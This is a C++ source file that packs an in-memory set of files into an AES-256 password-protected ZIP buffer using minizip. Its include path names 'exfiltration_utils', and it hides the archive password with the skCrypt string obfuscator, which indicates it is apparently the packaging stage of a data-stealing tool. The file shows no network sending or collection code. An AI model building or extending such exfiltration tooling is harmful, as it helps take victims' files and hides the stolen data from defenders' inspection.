#include <exfiltration_utils/zip.hpp>
#include <string>
#include <cstdint>

#include <mz.h>
#include <mz_os.h>
#include <mz_zip.h>
#include <mz_strm.h>
#include <mz_strm_mem.h>

#ifndef ZIP_PASS_STR
#define ZIP_PASS_STR "debug"
#endif

#include <crypto_utils/skCrypter.hpp>

namespace zip_utils {

std::vector<uint8_t> zip_to_buf(const mem_store::FileMap& files) {
    void* out_stream = mz_stream_mem_create();
    if (!out_stream) return {};

    mz_stream_mem_set_grow_size(out_stream, 64 * 1024);
    if (mz_stream_mem_open(out_stream, nullptr, MZ_OPEN_MODE_CREATE) != MZ_OK) {
        mz_stream_mem_delete(&out_stream);
        return {};
    }

    void* zip = mz_zip_create();
    if (!zip) {
        mz_stream_mem_close(out_stream);
        mz_stream_mem_delete(&out_stream);
        return {};
    }

    if (mz_zip_open(zip, out_stream, MZ_OPEN_MODE_WRITE) != MZ_OK) {
        mz_zip_delete(&zip);
        mz_stream_mem_close(out_stream);
        mz_stream_mem_delete(&out_stream);
        return {};
    }

    for (const auto& [vpath, buf] : files) {
        if (buf.empty()) continue;

        void* in_stream = mz_stream_mem_create();
        if (!in_stream) continue;

        mz_stream_mem_set_buffer(in_stream, const_cast<void*>(static_cast<const void*>(buf.data())), (int32_t)buf.size());
        if (mz_stream_mem_open(in_stream, nullptr, MZ_OPEN_MODE_READ) != MZ_OK) {
            mz_stream_mem_delete(&in_stream);
            continue;
        }

        mz_zip_file fi{};
        fi.version_madeby     = MZ_VERSION_MADEBY;
        fi.compression_method = MZ_COMPRESS_METHOD_DEFLATE;
        fi.filename           = vpath.c_str();
        fi.flag               = MZ_ZIP_FLAG_ENCRYPTED;
        fi.aes_version        = MZ_AES_VERSION;
        fi.aes_strength       = MZ_AES_STRENGTH_256;

        if (mz_zip_entry_write_open(zip, &fi, MZ_COMPRESS_LEVEL_DEFAULT, 0, skCrypt(ZIP_PASS_STR)) == MZ_OK) {
            uint8_t chunk[4096];
            int32_t rd;
            while ((rd = mz_stream_mem_read(in_stream, chunk, sizeof(chunk))) > 0)
                mz_zip_entry_write(zip, chunk, rd);
            mz_zip_entry_close(zip);
        }

        mz_stream_mem_close(in_stream);
        mz_stream_mem_delete(&in_stream);
    }

    mz_zip_close(zip);
    mz_zip_delete(&zip);

    const void* buf_ptr = nullptr;
    int32_t     buf_len = 0;
    mz_stream_mem_get_buffer(out_stream, &buf_ptr);
    mz_stream_mem_get_buffer_length(out_stream, &buf_len);

    std::vector<uint8_t> result;
    if (buf_ptr && buf_len > 0)
        result.assign(static_cast<const uint8_t*>(buf_ptr),
                      static_cast<const uint8_t*>(buf_ptr) + buf_len);

    mz_stream_mem_close(out_stream);
    mz_stream_mem_delete(&out_stream);
    return result;
}

}
